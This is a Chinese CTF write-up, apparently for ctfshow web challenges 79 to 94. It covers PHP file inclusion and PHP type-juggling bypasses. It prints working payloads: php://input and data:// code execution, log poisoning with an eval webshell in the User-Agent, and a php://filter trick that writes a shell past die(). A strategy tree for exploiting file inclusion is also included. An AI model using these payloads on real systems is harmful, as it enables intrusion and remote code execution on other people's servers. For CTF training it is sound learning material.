<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;? system(&#x27;whoami&#x27;);?&gt;</span><br></pre></td></tr></table></figure>





<p>结果 wp 跟我说这样就行了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?= system(&#x27;whoami&#x27;);?&gt;</span><br></pre></td></tr></table></figure>



<p><code>&lt;?=</code> 以代替 <code>&lt;? echo </code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?= system(&#x27;tac flag.***&#x27;);?&gt;</span><br></pre></td></tr></table></figure>





<blockquote>
<p>法一：input 协议 大小写绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload: </span><br><span class="line"></span><br><span class="line">POST /?file=Php://input HTTP/1.1</span><br><span class="line"></span><br><span class="line">&lt;?Php system(&quot;ls&quot;);?&gt;</span><br><span class="line"></span><br><span class="line">POST /?file=Php://input HTTP/1.1</span><br><span class="line"></span><br><span class="line">&lt;?Php system(&quot;cat flag.php&quot;);?&gt;</span><br><span class="line"></span><br><span class="line"># 仅需在请求行 大写即可</span><br></pre></td></tr></table></figure>

<p><strong>法二: data 协议 + 利用 php 性质绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line"></span><br><span class="line">?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw== # &lt;?php phpinfo();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?file=data://text/plain,&lt;?= `tac f*`;?&gt;</span><br><span class="line">?file=data://text/plain,&lt;?Php echo `tac f*`;?&gt;  # 可以无 ；</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>&lt;?php ?&gt;</code> :php 默认的开始、结束标签 <code>&lt;? ?&gt;</code> :需要开启 short_open_tag ，即 short_open_tag &#x3D; On。 <code>&lt;%%&gt;</code> :需要开启 asp_tags ，即 asp_tags &#x3D; On。 <code>&lt;?= ?&gt;</code> :用于输出，等同于- 可以直接使用 <code>&lt;%= %&gt;</code> :用于输出，等同于- ，需要开启 asp_tags ，才可以使用 short_open_tag 控制的是<code>&lt;? ?&gt;</code>标签。而并非<code>&lt;?= ?&gt;</code>标签，<code>&lt;?= ?&gt;</code>标签用于输出变量。当开启 short_open_tag，<code>&lt;? ?&gt;</code> 功能和<code>&lt;?php ?&gt;</code> 一样。 <a target="_blank" rel="noopener" href="https://blog.csdn.net/hsd2012/article/details/51194554?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-2-51194554-blog-100028185.pc_relevant_vip_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-2-51194554-blog-100028185.pc_relevant_vip_default&utm_relevant_index=3">php中代码开始标志类型(,,,&lt;% %&gt;,&lt;%&#x3D; %&gt;)</a></p>
</blockquote>
<p><strong>法三：data 协议 base64 加密</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOw==   # &lt;?php system(&#x27;ls&#x27;);</span><br><span class="line"></span><br><span class="line">/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs= # &lt;?php system(&#x27;cat flag.php&#x27;);</span><br></pre></td></tr></table></figure></blockquote>
<blockquote>
<p>&#x2F;&#x2F; 包含日志文件</p>
<p>&#x2F;&#x2F; bp 拦截请求 修改 UA 为 <?php @eval($_GET[1]);?></p>
<p>?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log&amp;1&#x3D;system(“tac fl0g.php”);</p>
</blockquote>
<h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /?file=Php://input HTTP/1.1</span><br><span class="line">&lt;?Php system(&quot;tac f*&quot;);?&gt;</span><br></pre></td></tr></table></figure>

<p>(需要先 ls)</p>
<h3 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接把伪协议禁了，抄一下上面日志注入的方法。</p>
<p>&#x2F;&#x2F; 在响应头中可以看到服务器为 nginx</p>
<p>&#x2F;&#x2F; 包含 nginx 访问日志记录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?file=/var/log/nginx/access.log&amp;1=system(&quot;tac%20fl0g.php&quot;); </span><br></pre></td></tr></table></figure>



<p>image-20250702183321642](..&#x2F;..&#x2F;AppData&#x2F;Roaming&#x2F;Typora&#x2F;typora-user-images&#x2F;image-20250702183321642.png</p>
<h3 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h3><p>​&#96;&#96;&#96;php<br>if(isset($_GET[‘file’])){<br>    $file &#x3D; $_GET[‘file’];<br>    $content &#x3D; $_POST[‘content’];<br>    $file &#x3D; str_replace(“php”, “???”, $file);<br>    $file &#x3D; str_replace(“data”, “???”, $file);<br>    $file &#x3D; str_replace(“:”, “???”, $file);<br>    $file &#x3D; str_replace(“.”, “???”, $file);<br>    file_put_contents(urldecode($file), “<?php die('大佬别秀了');?>“.$content);<br>}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">```php+HTML</span><br><span class="line">file_put_contents(urldecode($file), &quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;.$content);</span><br></pre></td></tr></table></figure>

<p>这句话的意思是，将 die＋$content，放入 url 解码后的$file 中。</p>
<p>思路：</p>
<p>$content 是任意可控的，但是前面是 die，所以要让 die die。</p>
<p>怎么让 die die 呢？因为 die 和$content 是一起读取的，所以我们让$file 用 base64 解码的方式写入，也就是说，先对 die 和$content 进行 base64 解码，再写入。那么我们把我们想要写入的命令先 base64 编码，就会无损。而 base64 解码只会注意 phpdie 这六个字符，所以 die 就没办法发挥作用了。</p>
<p>但是这里还有一个问题，因为 base64 是四个为单位，所以读取的时候会拉上后面两个字符。所以我们需要传入的 content 是“两个字符长度的垃圾数据”+“base64 编码的关键命令”</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaPD9waHAgc3lzdGVtKCdscycpOw==</span><br></pre></td></tr></table></figure>



<p>还有一个要绕过的过滤，是$file，但是很简单，他是先替换再解码，我们在替换的时候把指定字符藏起来不就好了？</p>
<p>当我们编码一次，浏览器不会帮我编码，于是服务器解码一次就发现了要过滤的字符。</p>
<p>当我们编码两次，那么服务器自己解码一次，获得的是我们编码一次的 URL 编码，没有要替换的字符，在最后的 url 解码部分才成为纯净的你原来想写入的代码。</p>
<blockquote>
<p>注意看，传过去的 file 参数经过了 urldecode() 函数解码。所以 file 参数的内容要经过 url 编码再传递。同时网络传递时会对 url 编码的内容解一次码，所以需要对内容进行两次 url 编码。</p>
<p>另外，需要绕过 die() 函数。</p>
<p>根据文章 <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php:&#x2F;&#x2F;filter的妙用</a> ，可以有以下思路：</p>
<ul>
<li>base64 编码范围是 0 ~ 9，a ~ z，A ~ Z，+，&#x2F; ，所以除了这些字符，其他字符都会被忽略。</li>
<li>所以对于 <code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt;</code> ，base64 编解码过滤之后就只有 <code>phpdie</code> 6 个字符了，即可进行绕过。</li>
<li>前面的 file 参数用 <strong>php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-encode</strong> 来解码写入，这样文件的 die() 就会被 base64 过滤，这样 die() 函数就绕过了。</li>
<li>后面再拼接 base64 编码后的一句话木马或者 php 代码，被解码后刚好可以执行。</li>
<li>由于 base64 是 4 个一组，而 <strong>phpdie</strong> 只有六个，所以要加两个字母凑足 base64 的格式。</li>
</ul>
<p>这题传参时，file 用 get 方法，content 用 post 方法。</p>
</blockquote>
<h3 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>虽然我很想用条件竞争，但是条件竞争的题目在前面来着…</p>
<p>被过滤的字符有：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php ~ ! @ # $ % ^ &amp; * ( ) - _ + = .</span><br></pre></td></tr></table></figure>

<p>拦住 <code>.</code> → 那就别用路径穿越</p>
<p>拦住 <code>php</code> → 不用 php:&#x2F;&#x2F;</p>
<p>没拦 <code>data:</code> → 尝试 data:&#x2F;&#x2F;</p>
<p>拦住 <code>=</code> → 尝试删掉结尾 &#x3D;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKTs/Pg</span><br></pre></td></tr></table></figure>

<p>📌 一、常见绕过技巧的【字符依赖表】</p>
<table>
<thead>
<tr>
<th>技术 &#x2F; Payload 用法</th>
<th>依赖字符（被过滤就不能用）</th>
<th>可用情况说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>php://input</code></td>
<td><code>php</code>、<code>:</code>、<code>/</code></td>
<td>伪协议输入</td>
</tr>
<tr>
<td><code>data://text/plain;base64,...</code></td>
<td><code>data</code>、<code>:</code>、<code>/</code>、（建议有 <code>=</code>）</td>
<td>base64 执行</td>
</tr>
<tr>
<td><code>file://path/to/file</code></td>
<td><code>:</code>、<code>/</code>、<code>.</code></td>
<td>本地文件包含</td>
</tr>
<tr>
<td><code>../../etc/passwd</code></td>
<td><code>.</code>、<code>/</code></td>
<td>路径穿越</td>
</tr>
<tr>
<td><code>phpinfo()</code></td>
<td><code>(</code>、<code>)</code>、<code>phpinfo</code></td>
<td>打探信息</td>
</tr>
<tr>
<td><code>eval($_GET[x])</code></td>
<td><code>$</code>、<code>(</code>、<code>)</code></td>
<td>任意执行</td>
</tr>
<tr>
<td><code>system(&quot;ls&quot;)</code></td>
<td><code>(</code>、<code>)</code>、<code>&quot;</code>、<code>system</code></td>
<td>命令执行</td>
</tr>
<tr>
<td>Base64 payload</td>
<td><code>=</code>（可以省略）</td>
<td><code>=</code> 是可选填充</td>
</tr>
<tr>
<td>Log 包含 (<code>/var/log/apache2/...</code>)</td>
<td><code>/</code>、<code>.</code></td>
<td>利用日志注入</td>
</tr>
<tr>
<td>Session 包含 (<code>/var/lib/php/sess_</code>)</td>
<td><code>/</code>、<code>.</code></td>
<td>利用 session 注入</td>
</tr>
<tr>
<td>包含远程文件 (<code>http://...</code>)</td>
<td><code>:</code>、<code>/</code>、<code>.</code>、<code>http</code></td>
<td>URL 包含（前提是 allow_url_include &#x3D; On）</td>
</tr>
</tbody></table>
<p>🌲 二、文件包含漏洞的【利用策略树】</p>
<p>这棵树你可以记成一个“先判断，再选择策略”的流程：</p>
<p>txt复制编辑看见 include、require → 判断是否用户可控</p>
<p>├── 是 → 看是否有过滤（preg_match）？<br>│<br>├── 没有过滤任何字符<br>│   └── ✅ 使用 php:&#x2F;&#x2F;input 直接包含 POST 的恶意代码<br>│<br>├── 过滤了 php:&#x2F;&#x2F; 或 php<br>│   └── ✅ 尝试 data:&#x2F;&#x2F; 协议（编码后的 payload）<br>│<br>├── 过滤了 <code>.</code> 或 <code>/</code><br>│   └── ❌ 无法使用路径穿越、log&#x2F;session包含<br>│<br>├── 过滤了 <code>=</code><br>│   └── ⚠️ base64 编码 payload 去掉 <code>=</code> 测试是否仍可解码<br>│<br>├── 没过滤 <code>:</code> 和 <code>data</code><br>│   └── ✅ 试试 <code>data://text/plain;base64,PD9...</code><br>│<br>├── 能访问日志、session 文件<br>│   └── ✅ 尝试日志注入、session 注入包含<br>│<br>└── 什么都不能用？<br>    └── 😢 尝试构造可用字符绕过、混淆符号、目录软链接等</p>
<p>🔁 三、实战用法：快速判断法</p>
<p>拿到一道文件包含题，可以快速这么判断：</p>
<p>text复制编辑1. 看是否 include($xx) 或 require($xx) ✅<br>2. 看是否 GET 控参？（如 ?file&#x3D;xxx） ✅<br>3. 看是否有过滤？（preg_match 或 replace） ✅<br>4. 把不能用的字符列出来 ❌<br>5. 和字符依赖表对照 ✅<br>6. 选最合适策略下 payload 🧠</p>
<h2 id="PHP特性"><a href="#PHP特性" class="headerlink" title="PHP特性"></a>PHP特性</h2><h3 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if(preg_match(&quot;/[0-9]/&quot;, $num))&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num))&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>intval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1 。 故此传入?num[]&#x3D;1,产生错误返回1。 并且preg_math()传入数组参数也会直接返回0</p>
</blockquote>
<p>⚠️ 小拓展：关于 SQL 注入中的数组绕过</p>
<p>你提到的这段也很经典：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.php?id=1  →  正常执行  </span><br><span class="line">.php?id[]=1 → 页面没变，可能是 id 被 intval 处理了</span><br></pre></td></tr></table></figure>

<p>在 PHP 中：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_GET[&#x27;id&#x27;] =&gt; array(1)  // 当参数是 id[]=1 时</span><br><span class="line"></span><br><span class="line">intval($_GET[&#x27;id&#x27;])     // 返回 1（带 Notice）</span><br></pre></td></tr></table></figure>

<p>所以，如果后台开发者粗心地写了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$id = intval($_GET[&#x27;id&#x27;]);</span><br></pre></td></tr></table></figure>

<p>那么：</p>
<ul>
<li>本来想防注入（比如你加了引号 ‘1），也不会有影响，因为 <code>intval(&#39;1&#39;) == 1</code>，<code>intval(&#39;1\&#39; or 1=1&#39;) == 1</code></li>
<li>更糟的是，<strong>你传数组也能绕过去！</strong></li>
</ul>
<h3 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先看题目，要求get一个num，值不等于4476并且intval之后等于4476</p>
<p>👉 <code>intval($num, 0)</code> 是什么意思？</p>
<ul>
<li>这个用法会让 PHP <strong>自动根据前缀判断进制</strong>：</li>
</ul>
<table>
<thead>
<tr>
<th>前缀</th>
<th>例子</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>无</td>
<td><code>123</code></td>
<td>十进制</td>
</tr>
<tr>
<td><code>0x</code></td>
<td><code>0x117c</code></td>
<td>十六进制</td>
</tr>
<tr>
<td><code>0</code></td>
<td><code>07744</code></td>
<td>八进制（PHP8 不推荐）</td>
</tr>
<tr>
<td><code>0b</code></td>
<td><code>0b110</code></td>
<td>二进制</td>
</tr>
</tbody></table>
<p>所以：</p>
<ul>
<li><code>intval(&quot;0x117c&quot;, 0)</code> &#x3D; 十六进制 <code>0x117c</code> &#x3D; <strong>十进制 4476</strong></li>
<li><code>intval(&quot;4476a&quot;, 0)</code> &#x3D; PHP 解析前面合法的部分，得到 <code>4476</code></li>
<li><code>intval(&quot;4476.1&quot;, 0)</code> &#x3D; 转换成 <code>4476</code></li>
</ul>
<p>注意：</p>
<p>这些例子都是 <strong>字符串不等于 “4476”</strong>，但经过 <code>intval()</code> 后结果是 <code>4476</code>，所以能通过判断，输出 <code>$flag</code>。</p>
<h3 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/i表示匹配大小写，/m表示多行匹配 ， &quot;行首&quot;元字符 (^) 仅匹配字符串的开始位置**， **而&quot;行末&quot;元字符 ($) 仅匹配字符串末尾,字符 ^ 和 $ 同时使用时，表示精确匹配，需要匹配到以php开头和以php结尾的字符串才会返回true 。</span><br><span class="line"></span><br><span class="line">是要求我们多行匹配到php但是单行匹配不到php。</span><br><span class="line"></span><br><span class="line">payload：?cmd=%0aphp // %0a表示换行符</span><br></pre></td></tr></table></figure>

<h3 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>4476.1</p>
<h3 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span 